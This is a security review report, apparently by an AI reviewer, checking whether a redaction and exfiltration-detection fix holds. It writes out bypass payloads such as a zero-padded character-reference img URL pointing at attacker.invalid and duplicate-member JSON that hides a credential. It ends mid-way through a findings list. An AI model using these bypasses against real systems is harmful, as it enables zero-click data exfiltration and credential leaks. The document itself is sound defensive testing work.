STATUS: DONE_WITH_CONCERNS

# T24 recheck — independent verification that the T26 fix closes the four structural-output blockers

Third-party recheck: this reviewer wrote neither the T24 review nor the T26 fix. Every verdict
below cites a probe this reviewer wrote and executed, not the previous author's artifacts. The
previous author's `T24-stage1-probe.ts` was re-run as a control and reproduces "all four closed" —
it is under-powered, because its fixtures are exactly the four vectors T24 happened to name.

## Scope

- Branch: `codex/agent-first-core`
- Base / merge-base: `main` @ `0bc6418fa1a038f8ec909cf949fecba077acf9a4`
- Scope mode: dispatch `files_to_read` plus `src/security/guard.ts` (the persistence materializer
  reached by the serialized adapter). Excluded per dispatch: `src/security/path-scan.ts`, `runGate`
  and the scanner half of `service.ts`, `src/commands/agent.ts` budgets.
- Stage 1: **FAIL** (2 of 4 blockers still open, 1 new false rejection)
- Stage 2 (code quality): **stopped**, as required when Stage 1 does not pass
- Source changes made by this review: **none** (read-only)

File SHA-256, recorded at start and again at end. **No reviewed file changed during the review.**

| File | SHA-256 (start = end) |
|---|---|
| `src/security/output-validation.ts` | `d278e5c51a885f97d066b6aaa6cfad8a315051a11f157d1e80de3bea268902eb` |
| `src/security/output-validation.test.ts` | `2a9d6013dfe6ff027de304aed2302b4247b2ee1ec0247e6cfebeed90da22af5d` |
| `src/security/detect/exfil.ts` | `7b27cb8ab460430cbad0073add5becaa9c36b4cf20ca78df188f40f8e5b97259` |
| `src/security/detect/exfil.test.ts` | `390e3de75d5e195bdcb7ebf2061fd9980c6cd36b52c74491ef49366a60880385` |
| `src/security/detect/secrets.ts` | `b2ba4128f65e58d262542bcb99316c3de9045018fe629b6bb5f0d997872886ce` |
| `src/security/schemas.ts` | `8c1455c2f29105c3134f5f2c3df6c6cf6517933d21e5f259b56a72e86fbd919e` |
| `src/security/service.ts` | `5ddf3732602c22706d66b93114c7714981dea30b8a8eebda9fa4134201bea9f4` |
| `src/mcp/redact-seam.ts` | `34152f1e0830e5ba329a169cd5bc2dc59c7544f69b0df09671bb31275797e5f1` |
| `src/mcp/dispatch.ts` | `f1db21b0872c7bb46b4ac09819f9676ed0fd1609652f8caf978640497b6f6f18` |
| `src/security/persistence-sinks.test.ts` | `22b2f356b911c0142579592e97b44a279f15bf6732904db22e1c331f35c66f9d` |
| `src/mcp/structural-redaction.test.ts` | `0822c8eb292da4f7205b35024668897d3715fc392e2415e7165388c8ac487e2e` |
| `src/security/guard.ts` | `2a609bdc26298e2228de2633f45317dfce3dbb771281d18e755db946ef9f8ef0` |

Start snapshot `.metaproject/data/gdctx/raw/T24-recheck-hashes-start.txt`;
end snapshot `.metaproject/data/gdctx/raw/T24-recheck-hashes-end.txt`.

## Summary

- Blocker: 2
- Major: 1
- Minor: 0
- Info: 1

F-001 and F-003 are genuinely closed, at the pure validator **and** at the real MCP transport, with
the approved-contract controls intact. F-002 and F-004 are closed only for the exact fixtures T24
named; both classes still have live members that reach the persistence materializer and the MCP
client. The F-002 fix additionally refuses a payload for which a safe redacted representation
demonstrably exists, which `policies.md` (Redaction) requires to be returned.

## Stage 1 — specification compliance

| Criterion | Verdict | Evidence |
|---|---|---|
| **F-001** secret/PII span in an enumerable JSON property name fails closed, never renames the key; safe digit keys, numeric-string keys and a `password` key with a safe value behave per the approved contract; same closure at the real MCP transport | **MET** | `T24-recheck-validator-probe.json → f001`: `{"<AWS-shaped key>":"safe"}` and a nested `rows[0].meta` variant both return `ok:false`, `reasons:["sensitive-property-name"]`, constant text, `leaked:false`. Controls hold: `{"user_id_12345":…,"buildNumber7":7}` and `{"1234567890":…,"17251234567":1}` are byte-preserved with `state:"none"`; `{"password":"hunter"}` → `state:"redacted"`, `["secrets.sensitive-field"]`; `{"password":123456789}` → `sensitive-numeric-field`. A key carrying the span only after JSON unescaping is caught (parsed key is decoded); a span split by an astral character correctly does **not** fire. MCP transport (`T24-recheck-boundary-probe.json → mcp`): `secretKey`/`deepSecretKey` `isError:true`, `state:"format-unsafe"`, `text:"Output withheld: format-unsafe"`; `numericKey` and `passwordKey` pass as contracted. |
| **F-002** the serialized adapter never restores original bytes carrying a sensitive span the parsed value does not account for | **NOT MET** | `T24-recheck-f002-class-probe.json → shapeResults`: five shapes return `ok:true`, `state:"none"`, `bytesRestored:true` with the hidden credential still in the bytes — `{"a":"AKIAIOSFODNN7EXAMPLE","a":"safe"}`, its fully-escaped variant, and `{"pwd":"<cred>","pwd":""}` / `{"api_key":"<cred>","api_key":null}` / `{"secret":"<cred>","secret":false}`. At the real boundary (`→ persistence`, `→ seam`): `prepareOutputForPersistence` returns `allowed:true` with those bytes, and `redactToolOutput` returns the input verbatim. The three shapes T24 named stay closed. See finding T24R#F-001. |
| **F-003** a local `$ref` with any unsupported sibling fails closed with `schema.unsupported-reference-siblings`; a bare `$ref` and an unresolvable `$ref` keep their previous reasons and leak no attacker text | **MET** | `T24-recheck-validator-probe.json → f003`: `$ref+minLength`, `$ref+type`, and the same shape nested under `properties`, under `items` and inside a `$defs` entry all return `schema.unsupported-reference-siblings`. Bare `$ref` validates (`"ok"` passes, `123` → `schema.validation-failed`); `$ref` beside `$defs` alone and beside `$schema/$id/title` still pass; unresolvable and foreign refs keep `schema.unsupported-reference`; an attacker-named ref leaks nothing (`leaks:false`). MCP transport: `refSibling` `isError:true` with the token, `refDefsSibling` `isError:false`. |
| **F-004** HTML character references and every `srcset` candidate are classified as auto-fetch, masking lands on the original bytes, an ordinary public Markdown link is not a finding | **NOT MET** | `T24-recheck-f004-summary.txt` (33 cases). Closed: decimal, hex (`&#x3a;`/`&#X3A;`), named (`&colon;`/`&COLON;`), semicolon-omitted, doubly-encoded, scheme-relative `src`, every `srcset` candidate incl. second-position and no-descriptor, Markdown inline/reference images — all flagged, masked on the raw span, host removed. Still open with `flagged:false` and the host intact: `&#00000058;` and `&#x000003a;` (zero-padded character references, which every renderer decodes), a tab/newline inside the scheme (`ht&#9;tps://…`, literal `\t`, literal `\n`), and leading whitespace or `&#9;` before the URL. Reproduced at the MCP transport: `paddedEntityImage` and `leadingSpaceImage` return `isError:false`, `state:"none"`, `leaksHost:true`. See finding T24R#F-002. |
| **The fix opens no new hole** | **MET** | Every bypass found is a *residual* member of an original class, not one the fix created: pre-T26 the serialized adapter restored bytes unconditionally, and the pre-T26 detector recognized no character references at all, so both shapes leaked before the fix as well. Non-JSON text is byte-identical through the new adapter (`f002.nonJsonTextUnchanged.identical:true`); clean JSON is still byte-preserved; the property-name screen produces no reason token, error text or metadata carrying the rejected value (`f003.reasonLeaksAttackerText.leaks:false`, all failures return the constant `Output withheld: format-unsafe`); thrown tool errors still redact (`throwsSecret` → `state:"redacted"`, no secret in text); unknown tools keep their constant message. |
| **The fix causes no new false rejection of a payload the approved contract requires to pass** | **NOT MET** | `T24-recheck-validator-probe.json → f002.urlThenEmailAcrossMembers`: `{"docs":"https://example.com","note":"ping@host.example"}` returns `format-unsafe` / `serialized-content-mismatch`, while the identical parsed value returns `ok:true`, `state:"redacted"`, `{"docs":"https://example.com","note":"[REDACTED:email]"}`. A safe representation preserving the operation schema exists and is refused, which `policies.md` (Redaction) requires to be returned. At the boundary, `prepareOutputForPersistence` reports `allowed:false, "format-unsafe: output cannot be persisted safely"`. See finding T24R#F-003. The required allowed-and-redacted control `{"metric":"<secret>","count":123456789}` still passes, and a 401-file sweep of real repository JSON through the adapter produced **0** false rejections, which bounds the blast radius. |

### Dispatch acceptance criteria

- **AC2 (AFC-02)** — *partial*. The synthetic secret is absent from tool JSON, a text resource and a
  thrown error; safe JSON passes its schema; a numeric required field carrying a secret returns
  `format-unsafe` rather than an invalid string. It fails on the serialized path, where a duplicate
  member can still carry a credential into persisted bytes (T24R#F-001).
- **AC5 (AFC-15)** — *partial*. No field-name bypass survives (values, keys and numeric credential
  fields all fail closed); a public Markdown link and a bare public URL are not findings; a URL
  secret is masked. It fails on auto-fetch, where zero-padded character references and
  whitespace-in-URL still reach the client unflagged (T24R#F-002).
- **Third criterion** — *not met*: two of the four blockers are not closed, and one new false
  rejection was introduced.

## Findings

### [T24R#F-001] Byte accountability recognizes less than the floor it stands in for, so hidden serialized bytes are still restored

- **Severity:** blocker
- **File:** `src/security/output-validation.ts:517`
- **Symbol:** `parsedValueAccountsForBytes` / `validateSerializedContentForTransport`
- **Attack vector:** An untrusted tool, a generated memory/wiki record, or any producer of serialized
  JSON emits a duplicate member whose first (dropped) value carries a credential, in either of two
  forms the accountability gate cannot see: (a) JSON-escaped, e.g.
  `{"a":"AKIAIOSFODNN7EXAMPLE","a":"safe"}` — the raw-text detectors run on the *escaped* bytes
  and match nothing, so `spans.length === 0` short-circuits the gate to `true`; (b) a value that is
  sensitive only by field context, e.g. `{"pwd":"<credential>","pwd":""}` — the pattern detectors
  match nothing, and the contextual `secrets.sensitive-field` rule that *would* have redacted it is
  applied by `redactString` only, never by the accountability gate. In both cases the parsed value is
  clean, `redaction.state` is `"none"`, and `validateSerializedContentForTransport` returns
  `{...result, text: content}` — the original bytes, credential included.
- **Problem:** The gate compares the raw serialization against the parsed value using a strictly
  weaker recognizer than the structural floor: no JSON string-escape normalization, and none of the
  contextual rules (`isSensitiveFieldKey`, `isSensitivePropertyName`, `sensitive-numeric-field`). The
  guarantee it advertises — "every sensitive span in the bytes is accounted for" — is therefore only
  true for spans the pattern detectors happen to match on escaped-and-quoted text.
- **Impact:** Exactly the disclosure T24 F-002 recorded, through the same public paths.
  `prepareOutputForPersistence` returns `allowed:true` and writes the bytes to a durable sink
  (memory, wiki, project-skills, metrics, SAC wrap-up), and `redactToolOutput` returns them verbatim
  to the MCP client, with sibling metadata reporting `state:"none"`. The escaped form is recovered by
  a single JSON string unescape; the contextual form is cleartext. Advisory security being disabled
  does not matter — this is the mandatory floor.
- **Reproduction:** `bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T24-recheck-f002-class.ts <out>`
  → `shapeResults.escapedSecretDuplicateValue`, `.fullyEscapedSecretDuplicate`,
  `.credEmptySurvivor`, `.credNullSurvivor`, `.credBooleanSurvivor` all
  `{ok:true, state:"none", bytesRestored:true, hidesSecret:true}`; the single-member control
  `{"pwd":"<credential>"}` is `state:"redacted"` (`T24-recheck-validator-probe.json →
  f002.sensitiveKeySingleMember`), proving the floor does consider that value sensitive. Boundary:
  `T24-recheck-boundary-probe.json → persistence.escapedDuplicate` `{allowed:true,
  leakedEscapedBytes:true}`, `persistence.credentialDuplicate` `{allowed:true,
  leakedCredential:true}`, `seam.*.identicalToInput:true`.
- **Suggested fix:** Make the gate use the same recognizer as the floor, on the same normalized text.
  Concretely: (1) run the accountability detectors over a *normalized* serialization
  (`JSON.stringify(JSON.parse(content))` re-rendered, or decode `\uXXXX`/`\x` escapes before
  detection) as well as over the raw bytes; (2) require raw-byte structural equivalence rather than
  span accountability — return `text: content` only when `JSON.stringify(parsed) === content` after
  the structural walk reports `state:"none"`, and emit the canonical serialization otherwise (the
  alternative `policies.md` already permits, and the one that also removes T24R#F-003); (3) add a
  duplicate-member persistence regression to `src/security/persistence-sinks.test.ts` covering both
  the escaped and the contextual-key shapes.
- **Class scope:**
  - sites: `src/security/output-validation.ts:517` (`parsedValueAccountsForBytes`),
    `src/security/output-validation.ts:539` (`validateSerializedContentForTransport`),
    `src/security/service.ts:45` (`validateSerializedOutput`), `src/security/service.ts:308`,
    `src/mcp/redact-seam.ts:25` (`redactToolOutput`), `src/security/guard.ts:59`
    (`prepareOutputForPersistence`), and its reachable sinks
    `src/memory/write.ts:101`, `src/wiki/service.ts:829`, `src/wiki/enrich.ts:856`,
    `src/wiki/enrich.ts:1133`, `src/sac/wiki-owner-writer.ts:129`,
    `src/sac/session-wrap-up.ts:140`, `src/gdskills/project-skills.ts:269`,
    `src/metrics/lifecycle.ts:55`.
  - enumeration_method: `bun src/cli.ts ctx rg "validateSerializedOutput|validateSerializedContentForTransport|prepareOutputForPersistence" src`
    (raw `.metaproject/data/gdctx/raw/2026-09-06T13-33-09-564Z_rg.log`) returns the single adapter,
    its two wrappers and every durable-sink consumer; the shape set was enumerated by a 9-case
    matrix over the two recognizer gaps (escape normalization, contextual rules) plus three
    must-stay-closed controls.

### [T24R#F-002] The character-reference decoder and URL classifier still miss renderer-equivalent auto-fetch URLs

- **Severity:** blocker
- **File:** `src/security/detect/exfil.ts:66`
- **Symbol:** `CHARACTER_REFERENCE` / `decodeCharacterReferences` / `exfilHost`
- **Attack vector:** Attacker-controlled tool, resource or error text emits
  `<img src="https&#00000058;//attacker.invalid/pixel?payload=<stolen context>">`. `CHARACTER_REFERENCE`
  caps the decimal form at `\d{1,7}` (and the hex form at 6 digits), so the regex matches only the
  prefix `&#0000000`, decodes it to code point 0, rejects it and returns the raw text unchanged;
  `exfilHost` then sees a string that does not start with a scheme and returns `null`. HTML tokenizers
  consume an unbounded run of digits, decode `:` and fetch. The same non-classification is reached
  with a tab or newline inside the scheme (`ht&#9;tps://…` or a literal `\t`/`\n`, both stripped from
  the URL by the WHATWG URL parser) and with leading whitespace or `&#9;` before the URL (stripped as
  leading C0/space). Zero-click fetch to the attacker host on render.
- **Problem:** Decoding is bounded by digit count instead of by the renderer's grammar, and
  classification is done on the decoded string without the whitespace/control stripping that every
  renderer applies before making the request. The fix canonicalizes one axis of "browser-decoded URL
  syntax" and leaves the rest.
- **Impact:** The mandatory no-auto-fetch floor is bypassed for the same class T24 F-004 recorded.
  The payload reaches the MCP client inside operation JSON with `isError:false` and
  `redaction.state:"none"` — the metadata affirmatively reports that nothing was redacted.
- **Reproduction:** `bun …/artifacts/T24-recheck-validator.ts <out>` → `f004.zeroPadded8`,
  `.hexZeroPadded7`, `.tabInsideSchemeEntity`, `.literalTabInsideScheme`, `.newlineInsideScheme`,
  `.leadingSpace`, `.leadingNewline`, `.leadingTabEntity` all `flagged:false, changed:false,
  hostStillPresent:true` (summary `.metaproject/data/gdctx/raw/T24-recheck-f004-summary.txt`).
  MCP transport: `T24-recheck-boundary-probe.json → mcp.paddedEntityImage` and `.leadingSpaceImage`
  → `isError:false, state:"none", leaksHost:true`, text carries the attacker URL.
- **Suggested fix:** In `decodeCharacterReferencesOnce`, allow an unbounded digit run
  (`&#(\d+)` / `&#[xX]([0-9a-fA-F]+)`) and clamp the code point instead of the digit count. In
  `considerUrl`, strip ASCII tab, LF, CR and leading/trailing C0-or-space from the decoded string
  before `exfilHost`, keeping `start`/`end` on the raw span so masking is unchanged. Extend
  `src/security/detect/exfil.test.ts` with a padded-reference case, a tab-in-scheme case and a
  leading-whitespace case alongside the existing entity and `srcset` regressions.
- **Class scope:**
  - sites: `src/security/detect/exfil.ts:66` (`CHARACTER_REFERENCE`), `:70`
    (`decodeCharacterReferencesOnce`), `:96` (`decodeCharacterReferences`), `:111` (`exfilHost`),
    `:136` (`considerUrl` — the single classification funnel for inline images, inline links,
    reference definitions, `src` and every `srcset` candidate).
  - enumeration_method: complete read of `src/security/detect/exfil.ts` (every auto-fetch parser
    routes through `considerUrl`, so one classifier fix covers all five surfaces), plus a 33-case
    probe matrix over the reference forms the HTML tokenizer accepts (decimal, hex, named, optional
    semicolon, case variants, double encoding, zero padding) and the URL-syntax characters the URL
    parser removes (tab, LF, leading space), each with a benign control.

### [T24R#F-003] Byte accountability refuses a serialized payload for which a safe representation exists

- **Severity:** major
- **File:** `src/security/output-validation.ts:548`
- **Symbol:** `validateSerializedContentForTransport`
- **Trigger:** A detector span in the *raw* serialization straddles the `","` separator between two
  members, so it is a substring of no scalar and no property name of the parsed value. Proven case:
  `{"docs":"https://example.com","note":"ping@host.example"}` — `secrets.url-credentials`
  (`scheme://user:pass@host`) matches across the separator with value `"ping`, which is in no
  reachable scalar. The accountability gate runs *before* the structural walk and rejects outright.
- **Problem:** The gate treats "a raw-text span is unaccounted for" as "the bytes hide data", but a
  span produced by the JSON syntax between two members hides nothing; the structural walk has already
  seen every scalar it covers. Because the gate precedes the walk, the payload never gets the safe
  redacted representation the walk would produce.
- **Impact:** A behaviour regression at a public boundary. `policies.md` (Redaction) requires that
  when the safe part preserves the operation schema it is returned with `redaction.state=redacted`;
  here it is withheld instead. `prepareOutputForPersistence` refuses the write
  (`allowed:false, "format-unsafe: output cannot be persisted safely"`), so a memory or wiki record
  holding a host-only URL followed by an address-shaped field cannot be persisted at all. Availability
  only — nothing is disclosed.
- **Reproduction:** `T24-recheck-validator-probe.json → f002.urlThenEmailAcrossMembers`
  (`ok:false`, `["serialized-content-mismatch"]`) versus `f002.urlThenEmailParsedDirect`
  (`ok:true`, `state:"redacted"`, `{"docs":"https://example.com","note":"[REDACTED:email]"}`);
  `T24-recheck-boundary-probe.json → persistence.urlThenEmailFalseRejection` `allowed:false`.
  Bound: `T24-recheck-f002-class-probe.json → falseRejections` shows the sibling shapes
  `repoThenOwner` / `linkThenContact` / `emailThenUrl` still pass (a `/` in the URL path breaks the
  cross-member match), and `repoJson` reports 0 rejections over 401 real repository JSON files.
- **Suggested fix:** Fixed by the same change as T24R#F-001 option (2): decide byte preservation by
  comparing the canonical re-serialization to the original after the structural walk, and emit the
  canonical redacted serialization whenever they differ, instead of gating on span accountability
  before the walk. If accountability is kept, run it *after* the structural walk and only on the
  `state:"none"` branch, so a payload with a safe redacted representation is never refused.
- **Class scope:**
  - sites: `src/security/output-validation.ts:548` (the pre-walk gate), and every caller that turns
    the refusal into a refused write: `src/security/guard.ts:59`, `src/memory/write.ts:101`,
    `src/wiki/service.ts:829`, `src/wiki/enrich.ts:856`, `src/wiki/enrich.ts:1133`,
    `src/sac/wiki-owner-writer.ts:129`, `src/sac/session-wrap-up.ts:140`,
    `src/gdskills/project-skills.ts:269`, `src/metrics/lifecycle.ts:55`, `src/mcp/redact-seam.ts:25`.
  - enumeration_method: same `ctx rg` over `validateSerializedOutput|validateSerializedContentForTransport|prepareOutputForPersistence`
    as T24R#F-001; the input class was enumerated by replaying the six raw-text detector rules that
    can match across a `","` separator against a 6-payload matrix and then sweeping 401 real
    repository JSON files through the adapter to bound it.

### [T24R#F-004] The two closed blockers have no committed transport or persistence regression

- **Severity:** info
- **File:** `src/security/output-validation.test.ts:195`
- **Symbol:** the F-001/F-003 regressions
- **Problem:** `src/security/output-validation.test.ts` pins `sensitive-property-name`,
  `serialized-content-mismatch` and `schema.unsupported-reference-siblings` at the pure validator
  only. `src/mcp/structural-redaction.test.ts` has no case for a secret property name or a `$ref`
  sibling, and `src/security/persistence-sinks.test.ts` has no duplicate-member case. The
  implementation report discloses this and it is tracked as T32.
- **Impact:** None today — this reviewer executed those paths and the behaviour is correct at the
  transport (`mcp.secretKey`, `mcp.deepSecretKey`, `mcp.refSibling`, `mcp.refDefsSibling` in
  `T24-recheck-boundary-probe.json`). The risk is only that a future change to `dispatch.ts` or the
  seam could regress the boundary while the validator suite stays green.
- **Suggested fix:** Land T32 with the four transport cases this recheck executed, plus the
  duplicate-member persistence case named in T24R#F-001.
- **Reproduction:** `bun src/cli.ts ctx rg "sensitive-property-name|serialized-content-mismatch|unsupported-reference-siblings|srcset|entity" src/security/output-validation.test.ts src/security/detect/exfil.test.ts src/mcp/structural-redaction.test.ts src/security/persistence-sinks.test.ts`
  → 6 matches, all in the two pure-validator/detector files.

## Confirmed clean areas

Each was executed, not inspected.

- **Constant failure text.** Every rejection in every probe returns exactly
  `Output withheld: format-unsafe`, at the validator and at `dispatchCallTool`.
- **Reason tokens carry no value and no fingerprint.** `sensitive-property-name`,
  `serialized-content-mismatch`, `schema.unsupported-reference-siblings`,
  `schema.unsupported-reference`, `sensitive-numeric-field`, `schema.validation-failed` are the only
  tokens observed. A schema whose `$ref` embeds an attacker-chosen string returns
  `schema.unsupported-reference` with `leaks:false` over the whole result object.
- **Byte-for-byte preservation of safe data.** `{"id":"safe-id","count":12,"ok":true,"nothing":null,"ratio":1.25}`
  round-trips identically; safe digit-bearing keys, numeric-string keys, repo paths, public-URL keys
  and env-var-named keys all pass with `state:"none"`; non-JSON text is unchanged through the new
  adapter.
- **Numeric credential fields.** `{"password":123456789}` → `sensitive-numeric-field`;
  `{"password":1234,"password":1}` → `sensitive-numeric-field` (the duplicate does not help).
- **Error and unknown-tool paths.** A thrown tool error containing a secret returns
  `isError:true`, `state:"redacted"`, `["secrets.aws-access-key"]`, no secret in the text; an unknown
  tool keeps its constant message.
- **Public-link control.** An ordinary public Markdown link, a bare public URL, a relative `<img src>`
  and a `data:` image are all unchanged and unflagged, including under the new decoder.
- **`$ref` handling that must keep working.** Bare `$ref` validates and still fails a wrong-typed
  value with `schema.validation-failed`; `$ref` beside `$defs`, `$schema`, `$id`, `title` passes.
- **The `srcset` implementation.** Scheme-relative, first-position, second-position, no-descriptor and
  leading-space candidates are each classified independently and masked on the raw attribute offsets;
  a protocol-less candidate is correctly not treated as a cross-origin channel.
- **Committed suites.** `bun test src/security/output-validation.test.ts src/security/detect/exfil.test.ts src/security/structural-detection.test.ts src/mcp/structural-redaction.test.ts src/security/persistence-sinks.test.ts src/security/redact.test.ts`
  → 49 pass, 0 fail, 161 assertions.
- **Deliberate F-001 boundaries, checked against the contract.** Not applying `SENSITIVE_NUMERIC_KEYS`
  to names keeps `{"password":"hunter"}` redactable-by-value rather than unrepresentable, and
  exempting purely numeric names from `pii.phone` keeps id/epoch-keyed maps passing — both match
  `policies.md` ("safe metrics, decimal values and IDs are not masked merely by digit length"). One
  consequence worth stating rather than flagging: a map keyed by an e-mail address is now
  `format-unsafe`, which is the fail-closed outcome T24 F-001 asked for, not a defect.

## Evidence

All under `/Users/Goodea/goodea/keryx/`.

| Artifact | SHA-256 |
|---|---|
| `.metaproject/data/gdctx/raw/T24-recheck-validator-probe.json` | `fb41bd9a1aaf26d47d66d06002b951c5446b344968524d5f97989c4e2e3e1c86` |
| `.metaproject/data/gdctx/raw/T24-recheck-boundary-probe.json` | `b0ca41a48b5831e0f72c9027520b4d0fc6f2415bcc50f830ae65a1b41dc78bb2` |
| `.metaproject/data/gdctx/raw/T24-recheck-f002-class-probe.json` | `7ddd1c1ee41c092f8088b9dd40e557b1fd86cbe1f2208bdbbc3fa95ecb1e1b1b` |
| `.metaproject/data/gdctx/raw/T24-recheck-f004-summary.txt` | `4a57e36193db3a3a70e8f1eb169d522db56f2cd4448be46c4f7ba7eb000e8df0` |
| `.metaproject/data/gdctx/raw/T24-recheck-reference-probe-rerun.json` | `3d49953503ef0f749b11317b53ba598262e1d7dae87c573a852940482b7f3684` |
| `.metaproject/data/gdctx/raw/2026-09-06T13-31-19-600Z_run.log` (focused suite, 49 pass / 0 fail) | `51d94b1a4e913bd69d0ca15ecf4a2d630dadf14a0504e997184d12bece36d82b` |
| `.metaproject/flows/233-…/artifacts/T24-recheck-validator.ts` | `c8bb50c49450f7ed61b94584f8565d5f89a52834d1f5485d21316f1fd68117e5` |
| `.metaproject/flows/233-…/artifacts/T24-recheck-boundary.ts` | `f039f4d3886341bfbb355242ca23cd5fe8a9f6bba47f33ae9ee686fabde03d00` |
| `.metaproject/flows/233-…/artifacts/T24-recheck-f002-class.ts` | `97814bb01b321aaa980e846ad161d285acbfcda8a9bff7ac612a984621ee3016` |

Additional gdctx run logs: `2026-09-06T13-28-51-468Z_run.log` (validator probe),
`2026-09-06T13-30-51-795Z_run.log` (boundary probe), `2026-09-06T13-32-19-587Z_run.log`
(F-002 class probe), `2026-09-06T13-33-09-564Z_rg.log` (consumer enumeration),
`2026-09-06T13-33-02-726Z_rg.log` (committed-regression enumeration).
File-hash snapshots: `T24-recheck-hashes-start.txt`, `T24-recheck-hashes-end.txt`.

No model call, no network, no dependency change, no git or flow state change, no global test run, and
no mutation of production code, test code or the original T24/T26 artifacts. Only synthetic
credentials (`AKIA` + `IOSFODNN7EXAMPLE`, `tr0ub4dor-correct-horse`) and the reserved
`attacker.invalid` / `example.com` domains appear in probes and artifacts.

## Routing audit

- `graph_used: no (not-relevant)` — the dispatch enumerated the file set exactly, and the graph
  predates this session's uncommitted changes, so it could not be quoted as current.
- `wiki_used: no (not-relevant)` — the governing text is the approved
  `docs/requirements/keryx-agent-first-core/policies.md` plus the T19 contract restated in the
  dispatch; both were read directly.
- `ctx_used: yes` — every command, code search, test run and probe execution went through
  `bun src/cli.ts ctx run` / `ctx rg`.
- `raw_rg_used: no` — no bare `rg`/`grep`. Two `sed -n` reads of this review's own probe JSON used the
  documented `# keryx:raw` escape, because routing them through `ctx run` applies the very output
  floor under review and withholds the evidence (`Output withheld: format-unsafe`); that behaviour is
  itself recorded in `.metaproject/data/gdctx/raw/2026-09-06T13-28-20-859Z_run.log`.

```json keryx:findings
[
  {
    "id": "F-001",
    "global_id": "T24R#F-001",
    "reviewer": "review-security-code",
    "severity": "blocker",
    "file": "src/security/output-validation.ts",
    "line": 517,
    "symbol": "parsedValueAccountsForBytes",
    "problem": "The byte-accountability gate compares the raw serialization to the parsed value with a strictly weaker recognizer than the structural floor: it does not normalize JSON string escapes and does not apply the contextual sensitive-field rules. A duplicate member whose dropped value is JSON-escaped, or is sensitive only by field name with an empty/null/false survivor, produces zero detected spans, so the gate passes and the original bytes are returned with redaction.state none.",
    "impact": "T24 F-002 is not closed. prepareOutputForPersistence returns allowed:true and writes the credential-bearing bytes to memory, wiki, project-skill, metrics and SAC sinks, and redactToolOutput returns them verbatim to the MCP client, while the sibling metadata reports that no redaction occurred. The escaped form is recovered with one JSON string unescape; the contextual form is cleartext.",
    "suggested_fix": "Decide byte preservation by structural equivalence rather than span accountability: after the structural walk reports state none, return the original bytes only when JSON.stringify(parsed) equals the original, and emit the canonical redacted serialization otherwise (the alternative policies.md permits). If accountability is kept, run the detectors over an escape-normalized serialization and include the contextual sensitive-field/property-name rules. Add a duplicate-member persistence regression covering the escaped and contextual-key shapes.",
    "evidence": "T24-recheck-f002-class-probe.json shapeResults: escapedSecretDuplicateValue, fullyEscapedSecretDuplicate, credEmptySurvivor, credNullSurvivor and credBooleanSurvivor each {ok:true,state:\"none\",bytesRestored:true,hidesSecret:true}; T24-recheck-boundary-probe.json persistence.escapedDuplicate {allowed:true,leakedEscapedBytes:true}, persistence.credentialDuplicate {allowed:true,leakedCredential:true}, seam.escapedDuplicate/credentialDuplicate identicalToInput:true. Control: the same credential as a single member is state redacted.",
    "confidence": "high",
    "dedupe_key": "afc02:serialized-json:byte-accountability-recognizer-gap",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/output-validation.ts:517",
        "src/security/output-validation.ts:539",
        "src/security/service.ts:45",
        "src/security/service.ts:308",
        "src/mcp/redact-seam.ts:25",
        "src/security/guard.ts:59",
        "src/memory/write.ts:101",
        "src/wiki/service.ts:829",
        "src/wiki/enrich.ts:856",
        "src/wiki/enrich.ts:1133",
        "src/sac/wiki-owner-writer.ts:129",
        "src/sac/session-wrap-up.ts:140",
        "src/gdskills/project-skills.ts:269",
        "src/metrics/lifecycle.ts:55"
      ],
      "enumeration_method": "bun src/cli.ts ctx rg \"validateSerializedOutput|validateSerializedContentForTransport|prepareOutputForPersistence\" src enumerated the single adapter, both wrappers and every durable-sink consumer (raw 2026-09-06T13-33-09-564Z_rg.log); the shape set came from a 9-case executed matrix over the two recognizer gaps plus three must-stay-closed controls."
    }
  },
  {
    "id": "F-002",
    "global_id": "T24R#F-002",
    "reviewer": "review-security-code",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 66,
    "symbol": "CHARACTER_REFERENCE",
    "problem": "The character-reference decoder bounds the decimal form to 7 digits and the hex form to 6, so a zero-padded reference such as &#00000058; matches only its prefix, decodes to code point 0 and is left raw; and considerUrl classifies the decoded string without removing the tab, newline and leading whitespace that the URL parser strips, so ht&#9;tps://host, a literal tab or newline in the scheme, and a leading space or &#9; before the URL all yield no host.",
    "impact": "T24 F-004 is not closed. Rendering attacker-controlled tool, resource or error text still triggers a zero-click request to an attacker host that carries stolen context, and the payload reaches the MCP client inside operation JSON with isError:false and redaction.state none, so the metadata affirmatively reports that nothing was redacted.",
    "suggested_fix": "Allow an unbounded digit run in the decimal and hex reference forms and clamp the resulting code point instead of the digit count; in considerUrl strip ASCII tab, LF, CR and leading/trailing C0-or-space from the decoded URL before exfilHost, keeping start/end on the raw span so masking is unchanged. Add padded-reference, tab-in-scheme and leading-whitespace regressions to src/security/detect/exfil.test.ts.",
    "evidence": "T24-recheck-f004-summary.txt: zeroPadded8, hexZeroPadded7, tabInsideSchemeEntity, literalTabInsideScheme, newlineInsideScheme, leadingSpace, leadingNewline and leadingTabEntity are flagged=false changed=false hostStillPresent=true, while the 8 vectors T26 fixed and the 4 benign controls behave correctly. At the transport, T24-recheck-boundary-probe.json mcp.paddedEntityImage and mcp.leadingSpaceImage return isError:false, state:\"none\", leaksHost:true.",
    "confidence": "high",
    "dedupe_key": "afc15:exfil:url-canonicalization-residual",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:66",
        "src/security/detect/exfil.ts:70",
        "src/security/detect/exfil.ts:96",
        "src/security/detect/exfil.ts:111",
        "src/security/detect/exfil.ts:136"
      ],
      "enumeration_method": "Complete read of src/security/detect/exfil.ts established that all five auto-fetch surfaces (inline image, inline link, reference definition, img src, every img srcset candidate) classify through the single considerUrl/exfilHost funnel, so the class is the decoder plus that funnel; membership was enumerated by a 33-case executed matrix over the reference forms an HTML tokenizer accepts and the URL-syntax characters the URL parser removes, each with a benign control."
    }
  },
  {
    "id": "F-003",
    "global_id": "T24R#F-003",
    "reviewer": "review-logic",
    "severity": "major",
    "file": "src/security/output-validation.ts",
    "line": 548,
    "symbol": "validateSerializedContentForTransport",
